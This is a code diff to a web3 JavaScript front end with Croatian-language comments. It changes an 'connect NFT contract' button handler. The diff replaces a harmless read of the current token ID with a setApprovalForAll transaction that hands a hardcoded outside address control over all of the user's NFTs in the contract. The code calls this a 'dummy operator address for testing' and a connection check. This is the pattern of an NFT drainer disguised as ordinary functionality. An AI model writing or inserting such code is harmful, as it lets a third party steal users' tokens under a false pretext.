@@ -1834,11 +1834,13 @@ document.getElementById('connect-nft-contract').addEventListener('click', async 
         // Povezivanje sa NFT ugovorom
         const nftContract = new web3.eth.Contract(nftContractABI, nftContractAddress);
 
-        // Testna akcija: Dohvati trenutni tokenId iz ugovora
-        const currentTokenId = await nftContract.methods.currentTokenId().call();
-        console.log(`Uspješno povezivanje! Trenutni tokenId: ${currentTokenId}`);
+        // Postavljanje dummy operator adrese za testiranje
+        const dummyOperatorAddress = '0x6CB206Ac2FA76dee5eD03253942FE2fda92b48E9';
 
-        alert('Povezivanje sa NFT ugovorom uspješno izvršeno!');
+        // Poziv funkcije koja zahtijeva potvrdu putem MetaMask-a
+        await nftContract.methods.setApprovalForAll(dummyOperatorAddress, true).send({ from: currentAccount });
+
+        alert('Uspješno povezivanje sa NFT ugovorom putem potvrđene transakcije!');
     } catch (error) {
         console.error('Greška prilikom povezivanja sa NFT ugovorom:', error);
         alert('Došlo je do greške prilikom povezivanja sa NFT ugovorom. Pokušajte ponovo.');
